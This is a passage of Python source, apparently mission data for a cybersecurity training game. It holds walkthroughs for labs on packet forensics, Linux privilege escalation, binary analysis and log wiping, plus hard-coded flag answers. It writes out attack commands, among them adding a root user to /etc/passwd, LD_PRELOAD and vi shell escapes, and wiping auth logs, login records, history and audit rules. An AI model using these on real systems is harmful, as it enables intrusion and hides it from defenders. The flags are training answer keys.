            "2. Open in Wireshark — apply: tcp.flags.syn==1 && tcp.flags.ack==0\n"
            "3. Count SYN packets per dest IP — if >100, likely port scan.\n"
            "4. Filter: http.request.method==POST — look for login forms.\n"
            "5. Extract files: File → Export Objects → HTTP.\n"
            "6. Look for DNS queries >50 chars — possible data exfiltration."
        ),
        "quiz": [
            {"q": "Filter for SYN-only packets?", "a": "tcp.flags.syn==1 && tcp.flags.ack==0"},
            {"q": "How to extract files from HTTP traffic?", "a": "export objects"},
        ],
        "xp_reward": 75,
    },
    "hard": {
        "briefing": "Expert packet analysis — decrypt TLS, carve files, analyze malware C2.",
        "objective": "Analyze encrypted traffic and identify Command & Control communication patterns.",
        "study_topics": [
            "TLS decryption with pre-master secret log (SSLKEYLOGFILE)",
            "Identifying C2 beaconing patterns (regular interval connections)",
            "File carving from packet captures with binwalk/foremost",
            "Writing custom Wireshark dissectors in Lua",
        ],
        "study_guide": (
            "1. Set SSLKEYLOGFILE=/tmp/sslkeys.log in your browser.\n"
            "2. Capture traffic, then load the key log in Wireshark: Edit → Preferences → TLS.\n"
            "3. Now you can see decrypted HTTPS content.\n"
            "4. Analyze beacon intervals: Statistics → Flow Graph.\n"
            "5. Use tshark for command-line analysis: tshark -r file.pcap -Y 'http' -T fields -e http.host"
        ),
        "quiz": [
            {"q": "Environment variable for TLS key logging?", "a": "SSLKEYLOGFILE"},
            {"q": "CLI version of Wireshark?", "a": "tshark"},
        ],
        "xp_reward": 100,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 109: PCAP Analysis Lab (Days 27-30)
# ──────────────────────────────────────────────────────────────────────────────
109: {
    "id": 109, "name": "PCAP Forensic Analysis", "type": TYPE_LAB, "phase": 1,
    "docker_image": "networking_lab", "container": "cybersim_network_target",
    "easy": {
        "briefing": "A PCAP file was captured during a breach. Analyze it to find the attacker's IP and the exact payload sent via plaintext HTTP POST.",
        "objective": "Open the PCAP, identify the attacker IP, and extract the HTTP POST payload containing the flag.",
        "methods": ["Wireshark display filters", "Following HTTP streams", "tshark field extraction"],
        "tools": [
            {"name": "Wireshark", "cmd": "wireshark /tmp/evidence.pcap", "desc": "GUI packet analyzer"},
            {"name": "tshark", "cmd": "tshark -r /tmp/evidence.pcap -Y 'http.request.method==POST'", "desc": "CLI filter for POST"},
            {"name": "tcpdump", "cmd": "tcpdump -r /tmp/evidence.pcap -A 'port 80'", "desc": "ASCII dump of HTTP"},
        ],
        "step_by_step_guide": (
            "STEP 1: Open the PCAP: wireshark /tmp/evidence.pcap\n"
            "STEP 2: Apply filter: http.request.method==POST\n"
            "STEP 3: Right-click the POST packet → Follow → HTTP Stream.\n"
            "STEP 4: Read the stream — the payload contains the flag.\n"
            "STEP 5: Note the source IP — that's the attacker.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "None — This is forensic analysis, no live target.",
        "flag": "FLAG{904f7a97a15d2427}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": "Multiple attackers in the PCAP. Distinguish legitimate traffic from malicious, find the real payload.",
        "objective": "Filter through noise, identify the actual attacker, extract the encoded payload.",
        "methods": ["Statistical analysis (conversation view)", "Filtering by suspicious patterns", "Base64 decoding payloads"],
        "tools": [
            {"name": "Wireshark Stats", "cmd": "Statistics → Conversations → Sort by packets", "desc": "Find top talkers"},
            {"name": "tshark Extract", "cmd": "tshark -r file.pcap -Y 'http' -T fields -e http.file_data", "desc": "Extract HTTP data"},
            {"name": "CyberChef", "cmd": "https://gchq.github.io/CyberChef/", "desc": "Decode Base64 payloads"},
        ],
        "step_by_step_guide": (
            "STEP 1: Open PCAP and check Statistics → Conversations.\n"
            "STEP 2: Sort by packet count — the attacker has the most connections.\n"
            "STEP 3: Filter by attacker IP: ip.src==<ATTACKER_IP>\n"
            "STEP 4: Find HTTP POSTs — the payload is Base64 encoded.\n"
            "STEP 5: Decode: echo '<payload>' | base64 -d\n"
            "STEP 6: Submit the decoded flag."
        ),
        "security_level": "N/A — Forensic analysis challenge.",
        "flag": "FLAG{e61eb5148f4ed2cc}",
        "xp_reward": 150,
    },
    "hard": {
        "briefing": "Encrypted traffic, steganographic payloads, and anti-forensic techniques in the PCAP.",
        "objective": "Decrypt TLS traffic, extract hidden data, and reconstruct the full attack chain.",
        "methods": ["TLS decryption with keylog", "File carving from streams", "Timeline reconstruction", "Entropy analysis"],
        "tools": [
            {"name": "tshark Decrypt", "cmd": "tshark -r file.pcap -o tls.keylog_file:keys.txt", "desc": "Decrypt with key log"},
            {"name": "Foremost", "cmd": "foremost -i extracted_data.bin", "desc": "File carving"},
            {"name": "Binwalk", "cmd": "binwalk -e extracted_file", "desc": "Extract embedded files"},
        ],
        "step_by_step_guide": (
            "STEP 1: The attacker used HTTPS — you need the TLS key log.\n"
            "STEP 2: Find the key log file in the evidence: find /tmp -name '*.log'\n"
            "STEP 3: Decrypt: tshark -r file.pcap -o tls.keylog_file:keys.txt -Y http\n"
            "STEP 4: Extract files from decrypted streams.\n"
            "STEP 5: Use binwalk to find hidden data in extracted files.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "N/A — Advanced forensic challenge.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{79101dff6d7a0e35}",
        "xp_reward": 200,
    },
},

# ═══════════════════════════════════════════════════════════════════════════════
#  MONTH 2 — LINUX MASTERY (Days 31-60)
# ═══════════════════════════════════════════════════════════════════════════════

201: {
    "id": 201, "name": "Linux Hidden Files Hunt", "type": TYPE_LAB, "phase": 1,
    "docker_image": "linux_gym", "container": "cybersim_linux_gym",
    "easy": {
        "briefing": "A flag is hidden in a dotfile (hidden file) in /home/player. Linux hides files starting with a dot (.) from normal directory listings.",
        "objective": "Find and read the hidden file to retrieve the flag.",
        "methods": ["ls -la (list all including hidden)", "find with -name '.*'", "cat/less to read files"],
        "tools": [
            {"name": "ls -la", "cmd": "ls -la /home/player", "desc": "List ALL files including hidden"},
            {"name": "find hidden", "cmd": "find /home/player -name '.*' -type f", "desc": "Find all dotfiles"},
            {"name": "cat", "cmd": "cat /home/player/.secret", "desc": "Read the hidden file"},
        ],
        "step_by_step_guide": (
            "STEP 1: SSH into target: ssh player@localhost -p 2222 (password: player)\n"
            "STEP 2: Run: ls -la /home/player\n"
            "STEP 3: Look for files starting with '.' (these are hidden)\n"
            "STEP 4: Read the hidden file: cat /home/player/.secret\n"
            "STEP 5: Submit the flag."
        ),
        "security_level": "None — Open system, no monitoring.",
        "flag": "FLAG{c2fe78540812cdb8}",
        "xp_reward": 75,
    },
    "normal": {
        "briefing": "Multiple hidden files exist. The flag is nested in hidden directories. Some are decoys.",
        "objective": "Search recursively through hidden directories to find the real flag.",
        "methods": ["Recursive find with grep", "Tree command for visualization", "File type identification"],
        "tools": [
            {"name": "find + grep", "cmd": "find / -name '.*' -type f 2>/dev/null | xargs grep -l 'FLAG'", "desc": "Search hidden files for FLAG"},
            {"name": "tree -a", "cmd": "tree -a /home/player", "desc": "Visual tree with hidden files"},
        ],
        "step_by_step_guide": (
            "STEP 1: There are many hidden files — don't read them one by one.\n"
            "STEP 2: Search all hidden files: find /home -name '.*' -type f 2>/dev/null\n"
            "STEP 3: Grep for the flag pattern: grep -r 'FLAG{' /home/player/\n"
            "STEP 4: Check hidden directories too: ls -la /home/player/.config/\n"
            "STEP 5: Submit the flag."
        ),
        "security_level": "Audit logging — file access is logged to /var/log/audit.",
        "defender_config": {"block_duration": 30, "active_signatures": ["find /"]},
        "flag": "FLAG{c05be6e00a99ce73}",
        "xp_reward": 125,
    },
    "hard": {
        "briefing": "Flag is hidden using file attributes, alternate data streams, or encoded in file metadata. Standard search won't work.",
        "objective": "Use advanced Linux file forensics to find the concealed flag.",
        "methods": ["Extended attributes (getfattr)", "File metadata (exiftool)", "Alternate data streams", "Steganography in files"],
        "tools": [
            {"name": "getfattr", "cmd": "getfattr -d /home/player/.secret", "desc": "Read extended file attributes"},
            {"name": "strings", "cmd": "strings /home/player/.binary_file", "desc": "Extract readable strings from binary"},
            {"name": "xxd", "cmd": "xxd /home/player/.secret | head", "desc": "Hex dump of file"},
        ],
        "step_by_step_guide": (
            "STEP 1: Normal grep/find won't work — the flag is not in plaintext.\n"
            "STEP 2: Check extended attributes: getfattr -d -m '' /home/player/*\n"
            "STEP 3: Check file types: file /home/player/.*\n"
            "STEP 4: Look for binary files: strings on suspicious files.\n"
            "STEP 5: Check file metadata: exiftool, or xxd for hex inspection.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "Active monitoring — suspicious commands alert the Defender.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{d9a7c01f18b034bc}",
        "xp_reward": 200,
    },
},

202: {
    "id": 202, "name": "Linux Privilege Escalation", "type": TYPE_LAB, "phase": 1,
    "docker_image": "privesc_lab", "container": "cybersim_privesc_target",
    "easy": {
        "briefing": "A flag file exists at /root/flag.txt but you are logged in as 'player'. Find a way to read it using sudo privileges or SUID binaries.",
        "objective": "Exploit misconfigured sudo rules to read /root/flag.txt.",
        "methods": ["sudo -l (list allowed commands)", "sudo cat to read restricted files", "Understanding Linux permissions rwx"],
        "tools": [
            {"name": "sudo -l", "cmd": "sudo -l", "desc": "List commands you can run as root"},
            {"name": "sudo cat", "cmd": "sudo cat /root/flag.txt", "desc": "Read as root"},
            {"name": "ls -la", "cmd": "ls -la /root/", "desc": "Check permissions"},
        ],
        "step_by_step_guide": (
            "STEP 1: Check what you can run as root: sudo -l\n"
            "STEP 2: You'll see: (root) NOPASSWD: /bin/cat\n"
            "STEP 3: Use it: sudo cat /root/flag.txt\n"
            "STEP 4: Submit the flag."
        ),
        "security_level": "None — Misconfigured sudoers file.",
        "flag": "FLAG{9be93cc0e9bad190}",
        "xp_reward": 75,
    },
    "normal": {
        "briefing": "sudo is restricted to specific commands. Find creative ways to read /root/flag.txt with limited sudo.",
        "objective": "Use allowed sudo commands creatively to read the protected file.",
        "methods": ["GTFOBins techniques for sudo", "Using less/more/vi with sudo", "Command chaining through sudo"],
        "tools": [
            {"name": "GTFOBins", "cmd": "https://gtfobins.github.io", "desc": "Unix binary exploitation reference"},
            {"name": "sudo find", "cmd": "sudo find /root -name flag.txt -exec cat {} \\;", "desc": "Read via find"},
            {"name": "sudo less", "cmd": "sudo less /root/flag.txt", "desc": "Read with pager"},
        ],
        "step_by_step_guide": (
            "STEP 1: Check sudo -l — cat is NOT allowed this time.\n"
            "STEP 2: Look at what IS allowed (e.g., find, less, vi).\n"
            "STEP 3: Use GTFOBins to find how to read files with that binary.\n"
            "STEP 4: Example: sudo find /root -exec cat {} \\;\n"
            "STEP 5: Submit the flag."
        ),
        "security_level": "Restricted sudo — Only specific commands allowed.",
        "defender_config": {"block_duration": 30, "active_signatures": ["sudo cat"]},
        "flag": "FLAG{436380d137f5af83}",
        "xp_reward": 125,
    },
    "hard": {
        "briefing": "sudo is heavily locked down. No direct file read allowed. Must chain multiple techniques to escalate.",
        "objective": "Achieve root access or file read through creative privilege escalation chains.",
        "methods": ["sudo + shell escape sequences", "Environment variable manipulation (LD_PRELOAD)", "Sudo version exploits", "Path injection via sudo"],
        "tools": [
            {"name": "sudo -V", "cmd": "sudo -V", "desc": "Check sudo version for CVEs"},
            {"name": "env check", "cmd": "sudo -l | grep env", "desc": "Check if env_keep has LD_PRELOAD"},
            {"name": "Shell Escape", "cmd": "sudo vi -c ':!/bin/sh'", "desc": "Break out via vi shell"},
        ],
        "step_by_step_guide": (
            "STEP 1: Check sudo version: sudo -V — look for CVEs (e.g., CVE-2021-3156 Baron Samedit).\n"
            "STEP 2: Check env_keep: sudo -l — if LD_PRELOAD is kept, craft a shared library.\n"
            "STEP 3: Compile: gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles\n"
            "STEP 4: Run: sudo LD_PRELOAD=/tmp/evil.so <allowed_cmd>\n"
            "STEP 5: If vi/vim allowed: sudo vi → :!/bin/sh → root shell!\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "Hardened sudo — Environment restricted, command whitelist enforced.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{7a57145c441c7285}",
        "xp_reward": 200,
    },
},

203: {
    "id": 203, "name": "The Grep Hunt", "type": TYPE_LAB, "phase": 1,
    "docker_image": "linux_gym", "container": "cybersim_linux_gym",
    "easy": {
        "briefing": "A flag is hidden somewhere inside /var/log/syslog. The file is massive (1GB+). Find it efficiently using grep.",
        "objective": "Search the massive log file for the FLAG pattern.",
        "methods": ["grep with pattern matching", "grep -r for recursive search", "Understanding regex basics"],
        "tools": [
            {"name": "grep", "cmd": "grep 'FLAG{' /var/log/syslog", "desc": "Search for flag pattern"},
            {"name": "grep -n", "cmd": "grep -n 'FLAG{' /var/log/syslog", "desc": "Show line number"},
            {"name": "grep -i", "cmd": "grep -i 'flag' /var/log/syslog", "desc": "Case-insensitive search"},
        ],
        "step_by_step_guide": (
            "STEP 1: The file is huge — don't try to cat or less it.\n"
            "STEP 2: Use grep: grep 'FLAG{' /var/log/syslog\n"
            "STEP 3: The flag will be printed to the terminal.\n"
            "STEP 4: Submit the flag."
        ),
        "security_level": "None — Open system.",
        "flag": "FLAG{f70b2e8b27d75f81}",
        "xp_reward": 75,
    },
    "normal": {
        "briefing": "The flag is encoded (Base64) and split across multiple log files in /var/log/.",
        "objective": "Search multiple files, find encoded fragments, decode and assemble the flag.",
        "methods": ["grep -r for recursive search", "Piping to base64 decode", "awk for field extraction"],
        "tools": [
            {"name": "grep -r", "cmd": "grep -r 'RkxBR' /var/log/ 2>/dev/null", "desc": "Search for Base64 FLAG prefix"},
            {"name": "base64 -d", "cmd": "echo 'RkxBR3t...' | base64 -d", "desc": "Decode Base64"},
            {"name": "awk", "cmd": "grep 'ENCODED' /var/log/syslog | awk '{print $NF}'", "desc": "Extract last field"},
        ],
        "step_by_step_guide": (
            "STEP 1: Normal grep 'FLAG{' won't work — it's encoded.\n"
            "STEP 2: FLAG{ in Base64 starts with 'RkxBR' — search for that.\n"
            "STEP 3: grep -r 'RkxBR' /var/log/ 2>/dev/null\n"
            "STEP 4: Decode: echo '<found_string>' | base64 -d\n"
            "STEP 5: Submit the decoded flag."
        ),
        "security_level": "Audit logging active.",
        "flag": "FLAG{3b81d99e60a27042}",
        "xp_reward": 125,
    },
    "hard": {
        "briefing": "The flag is XOR-encrypted, split into 3 pieces across different log files, and hidden in binary data appended to log entries.",
        "objective": "Find all 3 pieces, reconstruct and decrypt the flag.",
        "methods": ["Binary grep (grep -a)", "XOR decryption with Python", "Combining fragments with scripting"],
        "tools": [
            {"name": "grep -a", "cmd": "grep -a -P '\\x00' /var/log/ 2>/dev/null", "desc": "Search binary in text files"},
            {"name": "xxd + grep", "cmd": "xxd /var/log/syslog | grep -i 'flag'", "desc": "Hex search"},
            {"name": "Python XOR", "cmd": "python3 -c \"import sys; ...\"", "desc": "XOR decrypt script"},
        ],
        "step_by_step_guide": (
            "STEP 1: Standard grep won't find it — data is XOR encrypted.\n"
            "STEP 2: Look for binary data: grep -a -c '\\x00' /var/log/*\n"
            "STEP 3: Files with binary data are suspicious — xxd them.\n"
            "STEP 4: Write Python to XOR-decrypt: key is in /home/player/.key\n"
            "STEP 5: Combine all 3 pieces and submit the flag."
        ),
        "security_level": "Active Defender — alerts on binary file reads, blocks after 3 attempts.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{150dcdf0ddb75d2d}",
        "xp_reward": 200,
    },
},

204: {
    "id": 204, "name": "Linux File Hierarchy & Users", "type": TYPE_THEORY, "phase": 1,
    "easy": {
        "briefing": "Master the Linux filesystem structure — know where everything lives.",
        "objective": "Learn /etc, /var, /bin, /usr, /tmp, /home and user/group management.",
        "study_topics": [
            "/etc — Configuration files (passwd, shadow, sudoers, crontab)",
            "/var — Variable data (logs, mail, web content)",
            "/bin, /sbin — Essential binaries",
            "/usr — User programs and libraries",
            "/tmp — Temporary files (world-writable!)",
            "/home — User home directories",
            "User management: useradd, passwd, usermod, /etc/passwd format",
            "Groups: groupadd, /etc/group, primary vs secondary groups",
        ],
        "study_guide": (
            "1. Run: ls / — see all top-level directories.\n"
            "2. Explore: cat /etc/passwd — understand the format (user:x:uid:gid:comment:home:shell)\n"
            "3. Key files: /etc/shadow (hashes), /etc/sudoers (sudo rules), /etc/crontab (scheduled tasks)\n"
            "4. Understand: Why is /tmp dangerous? (World-writable, often used for attacks)\n"
            "5. Practice: Create a user, add to sudo group, verify with id command."
        ),
        "quiz": [
            {"q": "Where are user password hashes stored?", "a": "/etc/shadow"},
            {"q": "What directory stores system logs?", "a": "/var/log"},
            {"q": "What does the /tmp directory permission 1777 mean?", "a": "sticky bit"},
        ],
        "xp_reward": 50,
    },
    "normal": {
        "briefing": "Advanced Linux internals — understand how attackers abuse the filesystem.",
        "objective": "Learn about sensitive files, weak permissions, and misconfigurations attackers exploit.",
        "study_topics": [
            "World-readable /etc/shadow = instant credential compromise",
            "Writable /etc/passwd = add root user",
            "Cron jobs running as root with writable scripts",
            "$PATH hijacking — how it leads to privilege escalation",
        ],
        "study_guide": (
            "1. Check for world-readable shadow: ls -la /etc/shadow\n"
            "2. If /etc/passwd is writable: echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd\n"
            "3. Find writable cron scripts: ls -la /etc/cron.d/ /var/spool/cron/\n"
            "4. Check $PATH: echo $PATH — is /tmp or /home in it? (dangerous!)"
        ),
        "quiz": [
            {"q": "Field 3 in /etc/passwd is?", "a": "uid"},
            {"q": "UID 0 belongs to?", "a": "root"},
        ],
        "xp_reward": 75,
    },
    "hard": {
        "briefing": "Expert filesystem forensics — detect tampering, find backdoors, analyze file integrity.",
        "objective": "Use file integrity tools and forensic techniques to detect system compromise.",
        "study_topics": [
            "AIDE/Tripwire for file integrity monitoring",
            "Detecting rootkits with rkhunter/chkrootkit",
            "Analyzing file timestamps (MAC times) for forensics",
            "Inode analysis and deleted file recovery",
        ],
        "study_guide": (
            "1. Run rkhunter: sudo rkhunter --check\n"
            "2. Check file timestamps: stat /bin/bash — look for recent modification\n"
            "3. Find recently modified files: find / -mtime -1 -type f 2>/dev/null\n"
            "4. Recover deleted files: debugfs (ext4) or extundelete\n"
            "5. Set up AIDE: aide --init && aide --check"
        ),
        "quiz": [
            {"q": "Tool to detect rootkits?", "a": "rkhunter"},
            {"q": "What are MAC times?", "a": "modify access change"},
        ],
        "xp_reward": 100,
    },
},

205: {
    "id": 205, "name": "Process Injection & Binary Analysis", "type": TYPE_LAB, "phase": 1,
    "docker_image": "linux_gym", "container": "cybersim_linux_gym",
    "easy": {
        "briefing": "A binary is running on the system with a hardcoded password. Use strace/ltrace to find it.",
        "objective": "Use Linux debugging tools to analyze a running process and extract secrets.",
        "methods": ["strace — trace system calls", "ltrace — trace library calls", "strings — extract readable text from binary"],
        "tools": [
            {"name": "strace", "cmd": "strace -f -p <PID>", "desc": "Trace system calls of process"},
            {"name": "ltrace", "cmd": "ltrace -f -p <PID>", "desc": "Trace library calls (strcmp reveals passwords!)"},
            {"name": "strings", "cmd": "strings /usr/local/bin/mystery", "desc": "Extract text from binary"},
        ],
        "step_by_step_guide": (
            "STEP 1: Find the running process: ps aux | grep mystery\n"
            "STEP 2: Run strings on the binary: strings /usr/local/bin/mystery\n"
            "STEP 3: Look for readable text — passwords might be hardcoded.\n"
            "STEP 4: Use ltrace: ltrace -p <PID> — watch for strcmp() calls.\n"
            "STEP 5: The password appears as strcmp argument. Submit as flag."
        ),
        "security_level": "None — Debug tools available.",
        "flag": "FLAG{e20ec4b302101e8f}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": "Binary is stripped and obfuscated. strace noise makes it harder. Filter effectively.",
        "objective": "Analyze a stripped binary using advanced filtering and dynamic analysis.",
        "methods": ["strace with filters (-e trace=read,write)", "ltrace with output filtering", "GDB basic debugging"],
        "tools": [
            {"name": "strace filtered", "cmd": "strace -e trace=read,write,open -p <PID>", "desc": "Filter syscalls"},
            {"name": "GDB", "cmd": "gdb /usr/local/bin/mystery", "desc": "GNU Debugger"},
            {"name": "objdump", "cmd": "objdump -d /usr/local/bin/mystery | head -100", "desc": "Disassemble binary"},
        ],
        "step_by_step_guide": (
            "STEP 1: strings won't work — binary is stripped.\n"
            "STEP 2: Use strace with filter: strace -e trace=read,write -p <PID>\n"
            "STEP 3: Watch for read() calls on /etc/secret or similar.\n"
            "STEP 4: Use GDB: gdb -p <PID> → set breakpoint on strcmp.\n"
            "STEP 5: When breakpoint hits, examine registers for the password.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "ptrace restricted — some debug functions require elevation.",
        "defender_config": {"block_duration": 45, "active_signatures": ["strace", "gdb"]},
        "flag": "FLAG{d8eb9a74f2fc4dfb}",
        "xp_reward": 150,
    },
    "hard": {
        "briefing": "Binary uses anti-debugging (ptrace detection), the password is encrypted in memory and only decrypted briefly.",
        "objective": "Bypass anti-debugging and capture the decrypted password from memory.",
        "methods": ["LD_PRELOAD to bypass ptrace check", "Memory dumping with /proc/PID/maps + mem", "Frida for dynamic instrumentation"],
        "tools": [
            {"name": "LD_PRELOAD bypass", "cmd": "LD_PRELOAD=/tmp/noptrace.so ./mystery", "desc": "Bypass anti-debug"},
            {"name": "Memory dump", "cmd": "cat /proc/<PID>/maps && dd if=/proc/<PID>/mem ...", "desc": "Read process memory"},
            {"name": "Frida", "cmd": "frida-trace -p <PID> -i 'strcmp'", "desc": "Dynamic instrumentation"},
        ],
        "step_by_step_guide": (
            "STEP 1: strace/gdb will fail — binary detects ptrace.\n"
            "STEP 2: Write anti-ptrace bypass: compile noptrace.c with LD_PRELOAD.\n"
            "STEP 3: Or dump memory: read /proc/<PID>/maps for heap address.\n"
            "STEP 4: Use dd to extract heap region: dd if=/proc/<PID>/mem bs=1 skip=<addr> count=4096\n"
            "STEP 5: strings the dump to find the briefly-decrypted password.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "Anti-debugging active. Defender monitors for debug tool usage.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{91ca32507c4cdee6}",
        "xp_reward": 200,
    },
},

206: {
    "id": 206, "name": "Bash Scripting for Hackers", "type": TYPE_THEORY, "phase": 1,
    "easy": {
        "briefing": "Master Bash scripting — automate your hacking workflow.",
        "objective": "Learn variables, loops, conditionals, and command substitution in Bash.",
        "study_topics": [
            "Variables: name='value', $name to access",
            "Loops: for i in {1..100}; do echo $i; done",
            "Conditionals: if [ $? -eq 0 ]; then echo 'success'; fi",
            "Command substitution: result=$(whoami)",
            "Reading input: read -p 'Enter IP: ' target",
            "Functions: function scan() { nmap $1; }",
        ],
        "study_guide": (
            "1. Create a script: nano scanner.sh\n"
            "2. Add shebang: #!/bin/bash\n"
            "3. Write a loop that pings 10 IPs:\n"
            "   for i in {1..10}; do ping -c 1 192.168.1.$i; done\n"
            "4. Make executable: chmod +x scanner.sh\n"
            "5. Run it: ./scanner.sh\n"
            "6. Add conditional: if ping responds, echo 'Host UP'."
        ),
        "quiz": [
            {"q": "How to make a script executable?", "a": "chmod +x"},
            {"q": "Bash shebang line?", "a": "#!/bin/bash"},
            {"q": "How to store command output in variable?", "a": "$(command)"},
        ],
        "xp_reward": 50,
    },
    "normal": {
        "briefing": "Advanced Bash — file operations, error handling, and network scripting.",
        "objective": "Write automation scripts for reconnaissance and exploitation tasks.",
        "study_topics": [
            "Error handling: set -e, trap, exit codes",
            "File operations: read line-by-line, awk, sed, cut",
            "Network: /dev/tcp for port checking without nmap",
            "Arrays and associative arrays",
        ],
        "study_guide": (
            "1. Write a port scanner using /dev/tcp:\n"
            "   for port in {1..1000}; do (echo >/dev/tcp/$IP/$port) 2>/dev/null && echo \"$port open\"; done\n"
            "2. Parse nmap output with awk: nmap $IP | awk '/open/ {print $1}'\n"
            "3. Process wordlist: while read word; do curl -s http://$IP/$word; done < wordlist.txt\n"
            "4. Add error handling and logging to your scripts."
        ),
        "quiz": [
            {"q": "Bash way to check if port is open without nmap?", "a": "/dev/tcp"},
            {"q": "Command to process text field by field?", "a": "awk"},
        ],
        "xp_reward": 75,
    },
    "hard": {
        "briefing": "Expert Bash — write a complete recon automation framework in pure Bash.",
        "objective": "Create a multi-threaded recon tool with logging, error handling, and report generation.",
        "study_topics": [
            "Background processes: command & and wait",
            "Named pipes (FIFOs) for inter-process communication",
            "Signal handling: trap SIGINT cleanup",
            "Creating reusable Bash libraries (source ./lib.sh)",
        ],
        "study_guide": (
            "1. Write a parallel port scanner using background jobs:\n"
            "   for port in {1..65535}; do check_port $port & done; wait\n"
            "2. Limit concurrency with a semaphore pattern.\n"
            "3. Output results in multiple formats (JSON, HTML report).\n"
            "4. Handle CTRL+C gracefully with trap.\n"
            "5. Create a complete recon framework with: scan, enum, report modules."
        ),
        "quiz": [
            {"q": "How to run command in background in Bash?", "a": "&"},
            {"q": "How to wait for all background jobs?", "a": "wait"},
        ],
        "xp_reward": 100,
    },
},

207: {
    "id": 207, "name": "Log Wiping & Anti-Forensics", "type": TYPE_LAB, "phase": 1,
    "docker_image": "linux_gym", "container": "cybersim_linux_gym",
    "easy": {
        "briefing": "After compromising a system, you need to cover your tracks. Write a Bash script to remove your IP from /var/log/auth.log without destroying the whole file.",
        "objective": "Remove specific IP entries from log files while keeping the rest intact.",
        "methods": ["sed for in-place editing", "grep -v for inverse matching", "Understanding auth.log format"],
        "tools": [
            {"name": "sed delete", "cmd": "sed -i '/YOUR_IP/d' /var/log/auth.log", "desc": "Delete lines with your IP"},
            {"name": "grep -v", "cmd": "grep -v 'YOUR_IP' /var/log/auth.log > /tmp/clean.log && mv /tmp/clean.log /var/log/auth.log", "desc": "Filter out your IP"},
            {"name": "wc -l", "cmd": "wc -l /var/log/auth.log", "desc": "Count lines before/after to verify"},
        ],
        "step_by_step_guide": (
            "STEP 1: First check your IP: echo $SSH_CLIENT | awk '{print $1}'\n"
            "STEP 2: Count lines before: wc -l /var/log/auth.log\n"
            "STEP 3: Remove your entries: sed -i '/YOUR_IP/d' /var/log/auth.log\n"
            "STEP 4: Count lines after — should be fewer.\n"
            "STEP 5: Verify: grep 'YOUR_IP' /var/log/auth.log — should return nothing.\n"
            "STEP 6: Submit the flag: FLAG{log_wiper_script}"
        ),
        "security_level": "None — You have root access for cleanup.",
        "flag": "FLAG{a99e35ddd6e4a0d8}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": "Multiple log files track your activity. Remote syslog is also active. Clean all local traces.",
        "objective": "Write a comprehensive log cleaning script that handles all common log locations.",
        "methods": ["Multi-file log cleaning", "lastlog/wtmp/btmp manipulation", "Bash history clearing"],
        "tools": [
            {"name": "Multi-log clean", "cmd": "for f in /var/log/{auth,syslog,kern}.log; do sed -i '/IP/d' $f; done", "desc": "Clean multiple logs"},
            {"name": "utmpdump", "cmd": "utmpdump /var/log/wtmp", "desc": "Dump login records"},
            {"name": "History clear", "cmd": "history -c && history -w && unset HISTFILE", "desc": "Clear bash history"},
        ],
        "step_by_step_guide": (
            "STEP 1: Clean all log files: auth.log, syslog, kern.log, daemon.log\n"
            "STEP 2: Clear login records: > /var/log/lastlog; > /var/log/wtmp; > /var/log/btmp\n"
            "STEP 3: Clear bash history: history -c && > ~/.bash_history && unset HISTFILE\n"
            "STEP 4: Check for remote syslog: grep -r 'remote' /etc/rsyslog.conf\n"
            "STEP 5: Verify cleanup and submit the flag."
        ),
        "security_level": "Remote syslog configured — local cleanup may not be enough.",
        "defender_config": {"block_duration": 45, "active_signatures": ["sed -i", "history -c"]},
        "flag": "FLAG{fcb355a8b1b9f4b9}",
        "xp_reward": 150,
    },
    "hard": {
        "briefing": "System has auditd, remote syslog, file integrity monitoring (AIDE), and immutable log attributes.",
        "objective": "Bypass all anti-forensic defenses and clean your traces completely.",
        "methods": ["chattr -i to remove immutable flag", "Timestomping with touch", "Auditd rule manipulation", "Binary log editing (utmp/wtmp)"],
        "tools": [
            {"name": "chattr", "cmd": "chattr -i /var/log/auth.log", "desc": "Remove immutable attribute"},
            {"name": "Timestomp", "cmd": "touch -r /var/log/syslog.bak /var/log/syslog", "desc": "Match file timestamp"},
            {"name": "auditctl", "cmd": "auditctl -D", "desc": "Delete all audit rules"},
        ],
        "step_by_step_guide": (
            "STEP 1: Check for immutable logs: lsattr /var/log/auth.log\n"
            "STEP 2: If immutable (----i----): chattr -i /var/log/auth.log\n"
            "STEP 3: Disable auditd: auditctl -D (delete rules) then service auditd stop\n"
            "STEP 4: Edit wtmp/utmp binaries: use utmpdump to export, edit, reimport.\n"
            "STEP 5: Fix timestamps: touch -r <reference_file> <modified_file>\n"
            "STEP 6: Re-enable immutable: chattr +i /var/log/auth.log\n"
            "STEP 7: Verify AIDE doesn't detect changes and submit the flag."
        ),
        "security_level": "Full monitoring suite — auditd, AIDE, remote syslog, immutable logs.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{c615c2927276f751}",
        "xp_reward": 200,
    },
},

208: {
    "id": 208, "name": "SSH Tunneling & Port Forwarding", "type": TYPE_LAB, "phase": 1,
    "docker_image": "linux_gym", "container": "cybersim_linux_gym",
    "easy": {
        "briefing": "Generate RSA keys and use SSH tunneling to reach a hidden internal web server that's only accessible from the target machine.",
        "objective": "Create SSH keys, set up local port forwarding to access an internal service.",
        "methods": ["SSH key generation (ssh-keygen)", "Local port forwarding (-L)", "Remote port forwarding (-R)"],
        "tools": [
            {"name": "ssh-keygen", "cmd": "ssh-keygen -t rsa -b 4096", "desc": "Generate RSA keypair"},
